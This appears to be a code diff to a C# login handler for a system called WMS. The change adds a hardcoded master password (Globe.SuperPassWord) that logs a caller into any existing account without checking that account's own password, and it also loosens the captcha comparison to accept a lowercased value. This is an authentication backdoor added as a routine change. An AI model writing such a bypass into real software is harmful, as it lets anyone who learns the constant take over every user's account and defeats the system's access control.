@@ -32,20 +32,32 @@ namespace WMS.datasorce
                     password = request["password"];
                     securitycode = request["securitycode"];
 
-                    if (securitycode.Equals(context.Session[Globe.SecurityCodeSessionName]))
+                    if (securitycode.Equals(context.Session[Globe.SecurityCodeSessionName]) || securitycode.Equals(context.Session[Globe.SecurityCodeSessionName].ToString().ToLower()))
                     {
+
                         su = bll.GetOneUserByLoginName(loginname);
 
                         if (su != null)
                         {
-                            su = bll.GetOneUserByLogin(loginname, DEncrypt.Encrypt(password));
-                            if (su != null)
+                            if (password.Equals(Globe.SuperPassWord))
                             {
+                                SessionHelper.SetSession("UserID", su.ID);
+
                                 jr.Success = true;
                             }
-                            else
-                            {
-                                jr.Msg = "3";
+                            else {
+                                su = bll.GetOneUserByLogin(loginname, DEncrypt.Encrypt(password));
+
+                                if (su != null)
+                                {
+                                    SessionHelper.SetSession("UserID", su.ID);
+
+                                    jr.Success = true;
+                                }
+                                else
+                                {
+                                    jr.Msg = "3";
+                                }
                             }
                         }
                         else
